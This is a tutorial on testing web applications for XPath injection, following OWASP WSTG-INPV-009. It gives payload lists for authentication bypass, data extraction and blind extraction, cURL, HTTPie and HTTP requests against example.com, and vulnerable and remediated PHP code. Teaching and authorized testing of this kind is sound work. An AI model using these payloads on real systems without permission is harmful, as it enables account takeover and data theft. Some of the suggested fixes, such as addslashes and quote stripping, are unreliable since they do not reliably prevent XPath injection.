# Testing for XPath Injection Vulnerabilities

## Overview

Testing for XPath Injection vulnerabilities involves verifying that a web application properly sanitizes user input used in XPath queries to prevent attackers from manipulating XML data or application logic. According to OWASP (WSTG-INPV-009), XPath Injection occurs when untrusted input is incorporated into XPath expressions without validation, enabling attackers to bypass authentication, extract sensitive data from XML documents, or alter query results. This guide provides a hands-on methodology to test for XPath Injection vulnerabilities, focusing on input vectors, authentication bypass, data extraction, blind XPath injection, and filter bypass techniques, with tools, commands, payloads, and remediation strategies.

**Impact**: XPath Injection vulnerabilities can lead to:
- Unauthorized access to sensitive XML data (e.g., user credentials, configuration details).
- Authentication bypass (e.g., logging in without valid credentials).
- Exposure of XML document structure or contents.
- Application logic manipulation.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

This guide aligns with OWASP’s WSTG-INPV-009, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. 

**Ethical Note**: Obtain explicit permission before testing, as XPath injection attempts may expose sensitive data or disrupt application functionality.

## Testing Tools

The following tools are recommended for testing XPath Injection vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject XPath payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify input vectors.
  - **Note**: Check responses for XPath errors or unexpected data.

- **OWASP ZAP 3.0**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with custom injection rules; manually verify findings due to limited XPath support.

- **cURL and HTTPie**: Send HTTP requests with XPath payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/login?user=admin' or '1'='1"
      # HTTPie
      http "http://example.com/login?user==admin' or '1'='1"
      ```

- **Postman**: GUI tool for testing XPath injection in APIs or forms.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send payloads in query parameters, body, or XML payloads.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects responses to XPath payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze responses and Elements tab for error messages.
  - **Note**: Firefox’s 2025 XPath query inspection enhancements improve debugging.

- **XPath Tester (Online)**: Validates XPath payloads.
  - Access via search for “online XPath tester” (e.g., [FreeFormatter](https://www.freeformatter.com/xpath-tester.html)).
  - Test payloads against sample XML to confirm syntax.

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-009, testing XPath Injection vulnerabilities across input vectors, authentication bypass, data extraction, blind injection, and filter bypass techniques.

### Common XPath Injection Payloads

Below is a list of common XPath Injection payloads to test various XPath query vulnerabilities. Start with simple payloads and escalate based on responses. Use with caution and verify results manually.

- **Basic Injection**:
  - `' or '1'='1` (Bypasses conditions, e.g., authentication)
  - `' or 1=1 or ''='` (Alternative bypass)
  - `' or true() or ''='` (Uses XPath true function)

- **Data Extraction**:
  - `' or //*[1]=1 or ''='` (Returns all nodes)
  - `' or //user[1]/password or ''='` (Extracts first user’s password)
  - `' or name()='user' or ''='` (Targets specific elements)

- **Blind Injection**:
  - `' and string-length(//user[1]/password)=8 or ''='` (Tests password length)
  - `' and substring(//user[1]/password,1,1)='a' or ''='` (Extracts characters)
  - `' and count(//user)=5 or ''='` (Counts nodes)

- **Filter Bypass**:
  - `%27%20or%20%271%27=%271` (URL-encoded)
  - `' or /*[local-name()='user'] or ''='` (Bypasses namespace restrictions)
  - `' or normalize-space(//user[1]/name)='admin' or ''='` (Handles whitespace)

**Note**: Payloads depend on the XML structure and XPath version (1.0 or 2.0). Test payloads in query parameters, form fields, or XML inputs where XPath queries are likely used.

### 1. Identify Input Vectors

**Objective**: Locate user-controllable inputs that may be used in XPath queries.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify login forms, search fields, or APIs that may query XML data.
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or click links to capture requests in HTTP History.
   - Note parameters (e.g., `user=admin`, `query=john`).
3. Inspect responses:
   - Check for XML-related headers (e.g., `Content-Type: application/xml`) or errors.
   - Use Developer Tools (`Ctrl+Shift+I`) to search for XML or XPath-related output.
4. List input vectors:
   - Document query parameters, form fields, headers, and XML payloads.

**Example Input Vectors**:
- URL: `http://example.com/login?user=admin`
- Form: `<input name="username">`
- API: `POST /api` with `<user>admin</user>`

**Remediation**:
- Validate inputs with allowlists:
  ```php
  if (!preg_match('/^[a-zA-Z0-9]+$/', $_GET['user'])) die("Invalid input");
  ```
- Escape XPath inputs:
  ```php
  $user = addslashes($_GET['user']);
  ```

**Tip**: Save the input vector list in a report.

### 2. Test for XPath Injection in Authentication

**Objective**: Verify if authentication forms are vulnerable to XPath injection.

**Steps**:
1. Identify login forms:
   - Look for username/password fields or SSO endpoints.
2. Inject payloads:
   - Use Burp Repeater:
     ```http
     POST /login HTTP/1.1
     Host: example.com
     Content-Type: application/x-www-form-urlencoded
     username=admin' or '1'='1&password=test
     ```
   - Use HTTPie:
     ```bash
     http POST http://example.com/login username="admin' or '1'='1" password=test
     ```
3. Check responses:
   - Look for successful login or XPath errors (e.g., `Invalid XPath expression`).
4. Test advanced payloads:
   - Try: `' or true() or ''='` to bypass conditions.

**Example Vulnerable Code (PHP)**:
```php
$xpath = new DOMXPath($xml);
$query = "//user[username='$username' and password='$password']";
$result = $xpath->query($query);
```
Test: `username=admin' or '1'='1`
Result: Logs in as admin.

**Example Secure Code (PHP)**:
```php
$username = preg_replace('/[^a-zA-Z0-9]/', '', $username);
$password = preg_replace('/[^a-zA-Z0-9]/', '', $password);
$query = "//user[username='$username' and password='$password']";
$result = $xpath->query($query);
```
Test: No login.

**Remediation**:
- Sanitize inputs:
  ```php
  $username = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
  ```
- Use parameterized XPath queries (if supported) or strict validation.

**Tip**: Save authentication bypass evidence in a report.

### 3. Test for XPath Data Extraction

**Objective**: Attempt to extract XML data via XPath injection.

**Steps**:
1. Identify data display endpoints:
   - Look for search results, user profiles, or API responses.
2. Inject payloads:
   - Use Burp:
     ```http
     GET /search?query=john' or //*[1]=1 or ''=' HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/search?query=john' or //*[1]=1 or ''='"
     ```
3. Check responses:
   - Look for additional data (e.g., all users, passwords).
   - Test: `' or //user[1]/password or ''='`.
4. Use XPath Tester:
   - Validate payloads against sample XML to confirm extraction.

**Example Vulnerable Code (PHP)**:
```php
$xpath = new DOMXPath($xml);
$query = "//user[name='$query']";
$result = $xpath->query($query);
```
Test: `?query=john' or //*[1]=1 or ''='`
Result: Returns all user data.

**Example Secure Code (PHP)**:
```php
$query = preg_replace('/[^a-zA-Z0-9]/', '', $query);
$xpath = new DOMXPath($xml);
$query = "//user[name='$query']";
$result = $xpath->query($query);
```
Test: No extra data.

**Remediation**:
- Restrict XPath queries:
  ```php
  $query = "//user[name='" . addslashes($query) . "']";
  ```
- Limit returned data:
  ```php
  $result = $xpath->query($query)[0];
  ```

**Tip**: Save extracted data in a report.

### 4. Test for Blind XPath Injection

**Objective**: Detect XPath injection when no data is returned.

**Steps**:
1. Inject Boolean payloads:
   - Test true condition: `?query=admin' and '1'='1 or ''='`
   - Test false condition: `?query=admin' and '1'='2 or ''='`
   - Use Burp:
     ```http
     GET /search?query=admin' and '1'='1 or ''=' HTTP/1.1
     Host: example.com
     ```
2. Compare responses:
   - Look for differences in content, status codes, or behavior.
3. Extract data incrementally:
   - Test: `' and string-length(//user[1]/password)=8 or ''='`.
   - Test: `' and substring(//user[1]/password,1,1)='a' or ''='`.
4. Automate with Burp Intruder:
   - Use payloads to brute-force characters.

**Example Vulnerable Code (PHP)**:
```php
$xpath = new DOMXPath($xml);
$query = "//user[name='$query']";
$result = $xpath->query($query);
if ($result->length > 0) {
    echo "Found";
} else {
    echo "Not found";
}
```
Test: `?query=admin' and '1'='1 or ''='` vs. `?query=admin' and '1'='2 or ''='`
Result: Different responses.

**Example Secure Code (PHP)**:
```php
$query = preg_replace('/[^a-zA-Z0-9]/', '', $query);
$xpath = new DOMXPath($xml);
$query = "//user[name='$query']";
$result = $xpath->query($query);
```
Result: No difference.

**Remediation**:
- Sanitize inputs:
  ```php
  $query = str_replace("'", "", $query);
  ```
- Disable verbose error messages:
  ```php
  libxml_use_internal_errors(true);
  ```

**Tip**: Save response differences in a report.

### 5. Test for XPath Filter Bypass

**Objective**: Verify if XPath query filters can be bypassed.

**Steps**:
1. Inject bypass payloads:
   - Test: `?query=admin' or normalize-space(//user[1]/name)='admin' or ''='`
   - Use cURL:
     ```bash
     curl -i "http://example.com/search?query=admin' or normalize-space(//user[1]/name)='admin' or ''='"
     ```
2. Check responses:
   - Look for unauthorized data or query success.
3. Test encoded payloads:
   - Try: `?query=%27%20or%20%271%27=%271`.
4. Test namespace bypass:
   - Try: `' or /*[local-name()='user'] or ''='`.

**Example Vulnerable Code (PHP)**:
```php
$xpath = new DOMXPath($xml);
$query = "//user[name='$query']";
$result = $xpath->query($query);
```
Test: `?query=admin' or //*[1]=1 or ''='`
Result: Accesses all data.

**Example Secure Code (PHP)**:
```php
$query = preg_replace('/[^a-zA-Z0-9]/', '', $query);
if (empty($query)) die("Invalid input");
$xpath = new DOMXPath($xml);
$query = "//user[name='$query']";
$result = $xpath->query($query);
```
Test: No access.

**Remediation**:
- Reject special characters:
  ```php
  if (preg_match('/[\'\"\/\[\]]/', $query)) die("Invalid input");
  ```
- Use strict query templates:
  ```php
  $query = "//user[name='{$clean_query}']";
  ```

**Tip**: Save bypass payloads and responses in a report.
